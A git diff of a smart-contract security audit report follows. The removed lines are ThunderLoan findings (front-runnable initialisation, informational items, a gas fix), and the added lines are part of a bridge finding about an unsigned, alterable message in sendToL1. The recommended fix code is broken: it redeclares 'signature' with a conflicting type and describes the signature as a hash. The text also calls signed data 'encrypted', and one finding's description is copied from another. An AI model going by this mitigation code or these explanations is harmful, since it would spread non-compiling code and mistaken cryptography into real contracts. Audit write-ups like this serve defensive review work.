-- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 287](src/upgradedProtocol/ThunderLoanUpgraded.sol#L287)
-
-	```javascript
-	    function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
-	```
-
-</details>
-
-### [L-2]: Initialisation can be front run. 
-
-**Description:** By front running the initialise function, someone other than the deployer of the contract can initialize the contract. 
-
-**Impact:** An unintended (malicious) user can take ownership of the contract at initialisation.  
-
-**Recommended Mitigation:** Deploy and initialise through the same function. This is currently already done in the [DeployThunderLoan] script.
-
-
-## Informational 
-
-### [I-1]: `public` functions not used internally could be marked `external`
-
-Instead of marking a function as `public`, consider marking it as `external` if it is not used internally.
-
-<details><summary>6 Found Instances</summary>
-- Found in src/protocol/ThunderLoan.sol [Line: 254](src/protocol/ThunderLoan.sol#L254)
-
-	```javascript
-	    function repay(IERC20 token, uint256 amount) public {
-	```
-
-- Found in src/protocol/ThunderLoan.sol [Line: 313](src/protocol/ThunderLoan.sol#L313)
-
-	```javascript
-	    function getAssetFromToken(IERC20 token) public view returns (AssetToken) {
-	```
-
-- Found in src/protocol/ThunderLoan.sol [Line: 317](src/protocol/ThunderLoan.sol#L317)
-
-	```javascript
-	    function isCurrentlyFlashLoaning(IERC20 token) public view returns (bool) {
-	```
-
-- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 230](src/upgradedProtocol/ThunderLoanUpgraded.sol#L230)
-
-	```javascript
-	    function repay(IERC20 token, uint256 amount) public {
-	```
-
-- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 275](src/upgradedProtocol/ThunderLoanUpgraded.sol#L275)
-
-	```javascript
-	    function getAssetFromToken(IERC20 token) public view returns (AssetToken) {
-	```
-
-- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 279](src/upgradedProtocol/ThunderLoanUpgraded.sol#L279)
-
-	```javascript
-	    function isCurrentlyFlashLoaning(IERC20 token) public view returns (bool) {
-	```
-</details>
-
-### [I-2]: Missing checks for `address(0)` when assigning values to address state variables
-
-Check for `address(0)` when assigning values to address state variables.
-
-<details><summary>1 Found Instances</summary>
-
-
-- Found in src/protocol/OracleUpgradeable.sol [Line: 17](src/protocol/OracleUpgradeable.sol#L17)
-
-	```javascript
-	        s_poolFactory = poolFactoryAddress;
-	```
-
-</details>
-
-### [I-3]: functions should emit an event what state variables are changed. Some of these events are missing. 
-
-Check for `address(0)` when assigning values to address state variables.
-
-<details><summary>1 Found Instances</summary>
-
-- Found in src/protocol/OracleUpgradeable.sol [Line: 304](src/protocol/ThunderLoan.sol#L304)
-
-	```javascript
-	       s_flashLoanFee = newFee;
-	```
-
-</details>
-
-### [I-4]: It is considered bad practice to change live code to improve testing. Remove and adapt testing files accordingly. 
-
-**Description:**  `IFlashLoanReceiver.sol` includes an unused import of `IThunderLoan`. This import is used solely in the `MockFlashLoanReceiver.sol` test file. 
-
-**Recommended Mitigation:** Remove import from `IFlashLoanReceiver.sol` and adapt `MockFlashLoanReceiver.sol`. 
-
-At `IFlashLoanReceiver.sol` : 
-```diff 
--   import { IThunderLoan } from "./IThunderLoan.sol";
-```
-
-At `MockFlashLoanReceiver.sol` : 
-```diff 
--   import { IFlashLoanReceiver, IThunderLoan } from "../../src/interfaces/IFlashLoanReceiver.sol";
-+   import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
-+   import { IThunderLoan } from "../../src/interfaces/IThunderLoan.sol";
-
-```
-
-### [I-5]: Input parameters of `IThunderLoan::repay` differ from `ThunderLoan::repay` repay. 
-
-**Description:**  `IThunderLoan::repay` takes an `address` for the `token` field, while `ThunderLoan::repay` takes an `ERC20` for the token field. 
-
-**Recommended Mitigation:** Use `ERC20` in both cases. Adapt the `IThunderLoan::repay` function. Adjust any (test) files accordingly. 
-
-### [I-6]: State variable that remain unchanged should be immutable or constant. 
-
-**Description:** `ThunderLoan::s_feePrecision` is set at initialisation, but never changed afterwards. 
-
-**Recommended Mitigation:** Change `s_feePrecision` to immutable or, possibly, to a constant. 
-
-### [I-7]: Functions are missing natspecs. Please add.   
-
-**Description:** Almost all functions do not have natspecs. 
-
-**impact** Missing natspecs makes code less readable and increases the chance of inadvertently introducing vulnerabilities.
-
-**Recommended Mitigation:** Add natspecs throughout. 
-
-## Gas
-### [G-1]: `AssetToken.sol::updateExchangeRate` reads from storage multiple times, using gas. 
-
-**Description:** `AssetToken.sol::updateExchangeRate` reads from storage multiple times, each time using quite a bit of gas. 
-
+The function itself encodes the message using the  `v`, `r` and `s` values and subsequently retrieves the address from the encrypted message. This all happens within one line: 
 ```javascript
-@>    uint256 newExchangeRate = s_exchangeRate * (totalSupply() + fee) / totalSupply();
-
-@>    if (newExchangeRate <= s_exchangeRate) {
-        revert AssetToken__ExhangeRateCanOnlyIncrease(s_exchangeRate, newExchangeRate);
-    }
-    s_exchangeRate = newExchangeRate;
-@>    emit ExchangeRateUpdated(s_exchangeRate);
+    address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);
 ```
 
-**Recommended Mitigation:** This can be mitigated by creating a temporary variable in the function, and using this temporary variable to calculate the exchange rate.  This means the function only reads from storage once instead of three times. 
+However, because the message and signature are sent in separate files, it is possible to change the `message` value to anything. 
+
+**Impact:** In combination with front running the transaction, it allows a malicious user to send any value to their own address.
+
+**Recommended Mitigation:** Send the signature as a signed message. This will mage it impossible to change the content of the message, as it will alter the address that is retrieved. 
 
 ```diff
-+    uint256 rate = s_exchangeRate; 
++ 
+        // note: `signature` should be the result of hashing the message and v, r, s through an external function. 
++       function sendToL1(bytes32 signature, bytes memory message) public nonReentrant whenNotPaused {
+-       function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
+        bytes memory signature = abi.encodePacked(r, s, v); 
+-       address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);
++       bytes32 digest = MessageHashUtils.toEthSignedMessageHash(keccak256(message)); 
++       address signer = digest.recover(signature);
 
--    uint256 newExchangeRate = s_exchangeRate * (totalSupply() + fee) / totalSupply();
-+    uint256 newExchangeRate = rate * (totalSupply() + fee) / totalSupply();
+        if (!signers[signer]) {
+            revert L1BossBridge__Unauthorized();
+        }
 
--    if (newExchangeRate <= ras_exchangeRatete) {
--        revert AssetToken__ExhangeRateCanOnlyIncrease(s_exchangeRate, newExchangeRate);
-+    if (newExchangeRate <= rate) {
-+        revert AssetToken__ExhangeRateCanOnlyIncrease(rate, newExchangeRate);
-    }
-    s_exchangeRate = newExchangeRate;
--    emit ExchangeRateUpdated(s_exchangeRate);
-+    emit ExchangeRateUpdated(rate);
-
+        (address target, uint256 value, bytes memory data) = abi.decode(message, (address, uint256, bytes));
 ```
